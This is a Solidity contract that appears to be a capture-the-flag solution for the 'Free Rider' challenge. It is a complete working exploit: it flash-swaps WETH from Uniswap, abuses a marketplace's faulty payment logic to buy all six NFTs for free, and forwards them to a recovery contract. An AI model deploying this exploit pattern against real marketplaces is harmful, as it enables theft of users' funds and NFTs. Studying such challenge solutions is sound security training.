// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "solmate/src/tokens/WETH.sol";
import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderRecovery.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";

// --------------------------Interfaces----------------------------
interface IUniswapV2Pair {
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function token0() external view returns (address);

    function token1() external view returns (address);
}

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external;
}

// ----------------------------------------------------------------

/**
 * @title FreeRiderAttacker drains the FreeRiderNFTMarketplace.sol contract.
 * @author MJ
 */
contract FreeRiderAttacker is
    IUniswapV2Callee,
    ReentrancyGuard,
    IERC721Receiver
{
    IUniswapV2Pair public immutable pair;
    WETH public immutable weth;
    address public immutable attacker;
    FreeRiderNFTMarketplace public immutable marketplace;
    FreeRiderRecovery public immutable recovery;
    IERC721 private immutable nft;

    uint256 private constant NFT_ID = 6;

    /**
     * @notice Convenient modifier to handle WETH conversion before and after function execution
     */
    modifier handleWethConversion(uint256 _amount) {
        weth.withdraw(_amount);
        _;
        weth.deposit{value: _amount}();
    }

    constructor(
        IUniswapV2Pair _pair,
        FreeRiderNFTMarketplace _marketplace,
        FreeRiderRecovery _recovery,
        IERC721 _nft
    ) {
        // TODO: Usually would add zero address sanity checks but keep it out as it's a mock contract
        pair = _pair;
        weth = WETH(payable(address(pair.token0())));
        marketplace = _marketplace;
        recovery = _recovery;
        nft = _nft;
        attacker = msg.sender;
    }

    /**
     * @notice Attack the FreeRiderNFTMarketplace contract
     * The attacker will flash swap WETH from the Uniswap pair.
     * Essentially, we are going to flashloan WETH from the Uniswap pair, convert it into ETH, and withdraw all NFTs from the marketplace.
     * This is possible because the marketplace contract is vulnerable and repays the buyer after the NFT has been transferred to the new owner.
     * We will then repay the flash loan and withdraw all NFTs to the recovery contract.
     * @param _wethAmount Amount of WETH to flash swap
     * @dev This function is called by the attacker
     */
    function attack(uint256 _wethAmount) external payable {
        _flashSwap(_wethAmount);
        _withdraw();
    }

    function _flashSwap(uint256 wethAmount) internal {
        // We make an initial deposit of WETH to make sure we have enough to pay for the extra fee during repayment.
        weth.deposit{value: msg.value}();

        // Encoding the data to be passed to the `uniswapV2Call` function
        // If data is not supplied, the `uniswapV2Call` function will not be called
        // For our example, it can be any non 0 length bytes
        bytes memory data = abi.encode(address(weth), msg.sender);

        // We would just like to receive some weth
        // token 0 is `weth`
        pair.swap(wethAmount, 0, address(this), data);
    }

    /**
     * @notice Callback function called by the Uniswap pair when data is supplied.
     * @notice This function will be called by the Uniswap pair when the attacker calls `swap` on the pair
     *
     */
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint,
        bytes calldata
    ) external override {
        require(msg.sender == address(pair), "not pair");
        require(sender == address(this), "not sender");

        _drainMarketplace(amount0);

        // Repayment must be made for the uniswap LP fee which is 0.3% fee
        // We do uniswap math here with 997 (uniswap's decimal handler), and "+1" to round up the fee (to avoid underpayment)
        uint fee = (amount0 * 3) / 997 + 1;
        uint256 amountToRepay = amount0 + fee;

        // repay
        weth.transfer(address(pair), amountToRepay);
    }

    /**
     * @notice Retrieves the marketplace of all NFTs
     */
    function _drainMarketplace(
        uint256 _wethAmount
    ) internal handleWethConversion(_wethAmount) {
        uint256 nftId = NFT_ID;

        uint256[] memory tokenIds = new uint256[](nftId);

        // save gas
        for (uint256 i; i < nftId; ) {
            tokenIds[i] = i;
            unchecked {
                ++i;
            }
        }

        marketplace.buyMany{value: _wethAmount}(tokenIds);
    }

    /**
     * Withdraws all NFTs from this contract to the recovery contract
     */
    function _withdraw() internal {
        uint256 nftId = NFT_ID;
        for (uint256 i; i < nftId; ) {
            nft.safeTransferFrom(
                address(this),
                address(recovery),
                i,
                abi.encode(tx.origin)
            );

            unchecked {
                ++i;
            }
        }
    }

    receive() external payable {
        // do nothing
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external override nonReentrant returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
